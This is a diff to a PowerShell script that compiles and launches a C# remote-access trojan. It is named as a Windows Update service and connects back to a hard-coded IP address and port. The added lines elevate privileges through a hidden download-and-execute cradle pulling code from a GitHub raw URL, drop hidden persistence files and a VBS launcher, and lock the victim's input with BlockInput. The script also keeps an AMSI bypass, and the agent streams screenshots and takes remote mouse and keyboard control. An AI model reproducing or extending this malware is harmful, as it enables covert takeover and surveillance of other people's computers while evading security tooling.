@@ -1,10 +1,30 @@
 $serverIP = "198.1.195.204"
 $serverPort = 4000
-$logPath = "$env:TEMP\rat_log.txt"
+$installName = "WinUpdateSvc"
+$myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
-"Script iniciado..." | Out-File $logPath -Force
-Write-Host "Compilando agente C#..." -ForegroundColor Cyan
+Write-Host "[1] Iniciando..." -ForegroundColor Yellow
 
+$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+if (-not $isAdmin) {
+    Write-Host "[!] Pedindo Admin..." -ForegroundColor Cyan
+    try { Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('$myUrl')`"" -Verb RunAs -ErrorAction SilentlyContinue } catch {}
+    exit
+}
+Write-Host "[2] Admin OK." -ForegroundColor Green
+
+# Prepara a persistência (não esconde ainda)
+$dir = "$env:ProgramData\Microsoft\Windows\Caches"
+$scriptPath = "$dir\$installName.ps1"
+$vbsPath = "$dir\$installName.vbs"
+New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
+try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
+$vbsContent = 'CreateObject("WScript.Shell").Run "powershell.exe -nop -w hidden -ep bypass -f ""' + $scriptPath + '""", 0, False'
+Set-Content -Path $vbsPath -Value $vbsContent -Force -ErrorAction SilentlyContinue
+attrib +h +s +r $scriptPath 2>$null
+attrib +h +s +r $vbsPath 2>$null
+
+Write-Host "[3] Compilando Agente C#..." -ForegroundColor Yellow
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
@@ -23,11 +43,14 @@ if (-not ("R9KAgent" -as [type])) {
     public class R9KAgent {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+        [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
 
         static string IP;
         static int PORT;
         static bool streaming = false;
         static object writeLock = new object();
+
+        static bool isLocked = false;
         static int targetX = 0, targetY = 0;
         static bool hasNewPos = false;
 
@@ -38,7 +61,7 @@ if (-not ("R9KAgent" -as [type])) {
             while (true) {
                 TcpClient myClient = null;
                 try {
-                    Console.WriteLine("Conectando em " + IP + ":" + PORT);
+                    Console.WriteLine("[4] Conectando em " + IP + ":" + PORT + "...");
                     myClient = new TcpClient();
                     myClient.Connect(IP, PORT);
                     myClient.NoDelay = true;
@@ -48,7 +71,7 @@ if (-not ("R9KAgent" -as [type])) {
                     myWriter.AutoFlush = true;
 
                     myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
-                    Console.WriteLine("CONECTOU AO CONTROLE!");
+                    Console.WriteLine("[5] CONECTOU AO CONTROLE!");
 
                     Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                     Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();
@@ -58,7 +81,7 @@ if (-not ("R9KAgent" -as [type])) {
                         Thread.Sleep(100);
                     }
                 } catch (Exception ex) { 
-                    Console.WriteLine("ERRO: " + ex.Message);
+                    Console.WriteLine("[!] ERRO: " + ex.Message);
                     Thread.Sleep(3000); 
                 } finally {
                     streaming = false;
@@ -81,7 +104,11 @@ if (-not ("R9KAgent" -as [type])) {
         static void InputLoop() {
             while (true) {
                 try {
-                    if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
+                    if (isLocked) {
+                        if (Cursor.Position.X != targetX || Cursor.Position.Y != targetY) { Cursor.Position = new Point(targetX, targetY); }
+                    } else {
+                        if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
+                    }
                 } catch {}
                 Thread.Sleep(10);
             }
@@ -106,6 +133,20 @@ if (-not ("R9KAgent" -as [type])) {
                 if (cmd == "stream_start") { streaming = true; return; }
                 if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                 
+                if (cmd == "uninstall") { 
+                    BlockInput(false); 
+                    try {
+                        Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                        if (rk != null) { rk.DeleteValue("WinUpdateSvc", false); rk.Close(); }
+                        System.Diagnostics.Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
+                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
+                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
+                    } catch {}
+                    Environment.Exit(0); 
+                }
+                
+                if (cmd == "lock_mouse") { targetX = Cursor.Position.X; targetY = Cursor.Position.Y; isLocked = true; BlockInput(true); lock(writeLock) { myWriter.WriteLine("MOUSE_LOCKED"); } return; }
+                if (cmd == "unlock_mouse") { isLocked = false; BlockInput(false); lock(writeLock) { myWriter.WriteLine("MOUSE_UNLOCKED"); } return; }
                 if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                 if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }
 
@@ -159,5 +200,5 @@ if (-not ("R9KAgent" -as [type])) {
 "@
 }
 
-Write-Host "C# compilado com sucesso. Iniciando..." -ForegroundColor Green
+Write-Host "[4] C# Compilado. Chamando Agente..." -ForegroundColor Green
 [R9KAgent]::Start($serverIP, $serverPort)
